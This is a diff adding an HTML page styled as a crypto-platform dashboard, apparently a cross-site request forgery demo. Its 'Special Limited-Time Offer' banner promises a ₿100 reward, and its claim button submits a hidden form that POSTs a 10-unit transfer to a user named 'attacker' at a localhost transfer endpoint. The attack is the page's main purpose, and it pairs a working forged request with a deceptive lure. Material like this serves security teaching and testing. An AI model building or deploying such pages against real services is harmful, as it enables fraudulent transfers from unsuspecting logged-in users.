@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Crypto Platform | Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #6c5ce7;
+            --secondary-color: #a29bfe;
+            --dark-color: #2d3436;
+            --light-color: #f8f9fa;
+            --success-color: #00b894;
+            --warning-color: #fdcb6e;
+            --error-color: #d63031;
+            --border-color: #dfe6e9;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f6fa;
+            margin: 0;
+            padding: 0;
+            color: var(--dark-color);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            color: var(--primary-color);
+            font-size: 1.5rem;
+            font-weight: 500;
+        }
+        
+        .logo i {
+            margin-right: 10px;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+        }
+        
+        .user-info img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        
+        .balance-card {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 30px;
+            border-left: 5px solid var(--primary-color);
+        }
+        
+        .balance-amount {
+            font-size: 2.5rem;
+            font-weight: 500;
+            margin: 10px 0;
+            color: var(--primary-color);
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: var(--primary-color);
+            color: white;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #5649c0;
+        }
+        
+        .promo-banner {
+            background: linear-gradient(135deg, #fdcb6e 0%, #e17055 100%);
+            border-radius: 10px;
+            padding: 25px;
+            color: white;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .promo-banner h2 {
+            margin-top: 0;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .promo-banner p {
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .promo-banner .btn-promo {
+            background-color: white;
+            color: var(--dark-color);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .promo-banner::after {
+            content: "🎁";
+            position: absolute;
+            font-size: 120px;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 0.2;
+        }
+        
+        /* Hidden CSRF form */
+        #csrfForm {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-coins"></i>
+                <span>SecureCrypto</span>
+            </div>
+            <div class="user-info">
+                <img src="https://ui-avatars.com/api/?name={{ username }}&background=6c5ce7&color=fff" alt="User Avatar">
+                <span>{{ username }}</span>
+                <button class="btn btn-logout" onclick="window.location.href='/logout'">Logout</button>
+            </div>
+        </header>
+        
+        <div class="balance-card">
+            <h2>Your Balance</h2>
+            <div class="balance-amount">${{ balance }}</div>
+            <a href="/transfer" class="btn">Transfer Funds</a>
+        </div>
+        
+        <div class="promo-banner">
+            <h2>🎁 Special Limited-Time Offer!</h2>
+            <p>Congratulations {{ username }}! You've been selected to receive a ₿100 crypto reward!</p>
+            <button class="btn btn-promo" onclick="document.getElementById('csrfForm').submit()">Claim Your Prize Now</button>
+            
+            <!-- Hidden CSRF form -->
+            <form id="csrfForm" action="http://localhost:8000/transfer" method="POST">
+                <input type="hidden" name="to_user" value="attacker">
+                <input type="hidden" name="amount" value="10">
+            </form>
+        </div>
+    </div>
+</body>
+</html>
